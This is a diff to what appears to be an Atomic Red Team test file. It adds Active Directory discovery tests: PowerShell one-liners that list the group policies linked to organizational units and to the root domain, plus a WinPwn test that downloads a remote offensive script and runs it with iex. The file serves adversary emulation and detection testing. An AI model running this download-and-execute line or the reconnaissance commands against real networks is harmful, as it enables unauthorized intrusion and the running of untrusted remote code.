@@ -239,3 +239,40 @@ atomic_tests:
     elevation_required: false
     command: |
       ([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()
+- name: Enumerate Linked Policies In ADSISearcher Discovery
+  auto_generated_guid: 7ab0205a-34e4-4a44-9b04-e1541d1a57be
+  description: |
+    The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.
+    Upon successful execution a listing of users will output with their paths in AD.
+    Reference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      (([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] OU Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
+- name: Enumerate Root Domain linked policies Discovery
+  auto_generated_guid: 00c652e2-0750-4ca6-82ff-0204684a6fe4
+  description: |
+    The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.
+    Upon successful execution a listing of users will output with their paths in AD.
+    Reference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      (([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] Domain Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
+- name: WinPwn - generaldomaininfo
+  auto_generated_guid: ce483c35-c74b-45a7-a670-631d1e69db3d
+  description: Gathers general domain information using the generaldomaininfo function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      generaldomaininfo -noninteractive -consoleoutput
+    name: powershell
